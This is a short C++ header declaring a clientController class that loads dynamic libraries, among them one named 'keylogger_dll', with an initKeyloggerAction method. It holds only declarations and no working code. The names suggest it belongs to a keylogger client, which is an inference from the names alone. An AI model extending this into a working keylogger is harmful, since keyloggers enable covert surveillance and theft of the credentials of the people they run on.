#ifndef CLIENT_H__
# define CLIENT_H__

# include "DLibrary.h"

class	clientController {

	DLManager	libraries;

	// Dictionaries
	Dictionary	sayHello;
	Dictionary	keylogger_dll;

public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);			        // Destroy

	int			mainAction(int, char**);
	void		sayHelloAction(void);
	void		initKeyloggerAction(void);

};

#endif /* !CLIENT_H__ */
